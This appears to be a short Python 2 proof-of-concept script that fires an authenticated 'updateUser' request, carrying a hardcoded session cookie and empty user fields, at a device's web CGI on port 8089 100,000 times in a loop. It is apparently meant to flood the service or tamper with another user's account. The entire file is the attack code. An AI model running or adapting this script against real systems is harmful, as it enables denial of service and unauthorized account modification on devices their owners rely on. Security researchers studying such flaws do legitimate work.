#!/usr/bin/python

import urllib2 
req = urllib2.Request("https://192.168.124.111:8089/cgi?action=updateUser&user_id=5000&first_name=&last_name=&email=&language=")
req.add_header( "Cookie" ,"TRACKID=5b0be9e13e06ab73e08f7cfae595ffdd; session-identify=sid1872317714-1399885474; username=test2; user_id=3; position=home; locale=en-US; needApplyChange=yes")
i = 0
for i in range(0, 100000):
#while 1:
    res = urllib2.urlopen( req ) 
    html = res.read() 
    print html
    res.close()
